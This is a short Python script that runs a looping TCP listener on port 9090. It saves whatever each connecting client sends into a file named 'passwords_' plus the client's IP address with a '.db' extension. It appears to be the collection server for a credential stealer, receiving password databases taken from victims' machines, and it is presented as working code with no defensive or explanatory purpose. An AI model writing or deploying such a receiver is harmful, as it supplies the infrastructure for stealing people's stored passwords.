import socket

def OpenSocket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((client, port))
    print("Socket is successfully binded to " + client + ":" + str(port))

    sock.listen(1)
    print("Server is running - awaiting connection from client...")

    conn, addr = sock.accept()
    print("Connection received:")
    print("Connected with " + addr[0] + ":" + str(addr[1]))

    try:
        data = conn.recv(99999999)

        try:
            filesave = open("passwords_" + addr[0] + ".db", "wb")

            try:
                filesave.write(data)
                filesave.close()
            except IOError as e:
                print("ERROR: Can't write to file - ", e)
        except IOError as e:
            print("ERROR: Can't open file - ", e)
    except socket.error as e:
        print("ERROR: Connection failed - ", e)

    sock.close()
    print("Connection closed\n\n")


client = '0.0.0.0'
port = 9090
wantExit = False

while wantExit == False:
    OpenSocket()